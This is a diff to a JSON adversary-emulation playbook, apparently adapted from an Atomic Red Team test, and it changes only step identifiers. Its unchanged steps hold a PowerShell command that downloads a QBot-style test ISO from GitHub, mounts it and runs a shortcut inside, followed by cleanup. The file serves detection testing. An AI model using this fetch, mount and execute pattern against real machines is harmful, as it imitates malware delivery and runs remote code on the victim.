@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "1fc423aa-7b6f-4add-96df-9a17895078e9",
+      "id": "642353a5-5e34-5f8b-9426-d78d86dee2d1",
       "type": "execute-command",
       "data": {
         "command": "IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso\" -OutFile \"$env:TEMP\\qbot-test.iso\")\nMount-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\"\n$mountedpath = (Get-DiskImage -ImagePath \"$env:TEMP\\qbot-test.iso\" | Get-Volume).DriveLetter\n$finalpath = $mountedpath + \":\\\"\ncd $finalpath\n.\\calc.exe.lnk",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "224e05ef-315f-4d2e-b226-2caba391d4cf",
+      "id": "b7514df5-7657-5bac-9489-27a9c26e5a50",
       "type": "execute-command",
       "data": {
         "command": "start-sleep -s 5\nstop-process -Name \"Calculatorapp\" -Force \ndismount-diskimage -ImagePath \"$env:TEMP\\qbot-test.iso\"",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "1fc423aa-7b6f-4add-96df-9a17895078e9",
+      "s": "642353a5-5e34-5f8b-9426-d78d86dee2d1",
       "p": "on-success",
-      "o": "224e05ef-315f-4d2e-b226-2caba391d4cf"
+      "o": "b7514df5-7657-5bac-9489-27a9c26e5a50"
     },
     {
-      "s": "1fc423aa-7b6f-4add-96df-9a17895078e9",
+      "s": "642353a5-5e34-5f8b-9426-d78d86dee2d1",
       "p": "on-failure",
-      "o": "224e05ef-315f-4d2e-b226-2caba391d4cf"
+      "o": "b7514df5-7657-5bac-9489-27a9c26e5a50"
     }
   ],
   "tags": [
